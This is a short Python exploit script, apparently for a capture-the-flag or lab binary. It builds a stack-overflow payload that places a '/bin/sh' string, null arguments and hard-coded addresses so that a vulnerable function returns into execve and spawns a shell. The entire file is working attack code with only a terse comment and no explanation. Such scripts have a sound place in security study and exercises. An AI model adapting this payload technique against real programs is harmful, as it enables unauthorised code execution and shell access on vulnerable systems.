#!/usr/bin/env python3

import sys

""""
execve function call location -> 0x455050
overwrite a, b, c
redirect end of vulnerable to execve

   0x0000000000401e68 <+40>:    mov    rdx,QWORD PTR [rbp-0x18]
   0x0000000000401e6c <+44>:    mov    rcx,QWORD PTR [rbp-0x10]
   0x0000000000401e70 <+48>:    mov    rax,QWORD PTR [rbp-0x8]
"""

bin_sh_str = (0x0068732f6e69622f).to_bytes(8, 'little') + (b'\x00'*2)
a = (0x7ffffff68fae).to_bytes(8, 'little')
b = (0x7ffffff68fc8).to_bytes(8, 'little')
c = (0x0000000000401e21).to_bytes(8, 'little')

null_rdi = (0).to_bytes(8, 'little')
null_rsi = (0).to_bytes(8, 'little')

payload = bin_sh_str + null_rdi + null_rsi + a + b + c

sys.stdout.buffer.write(payload)
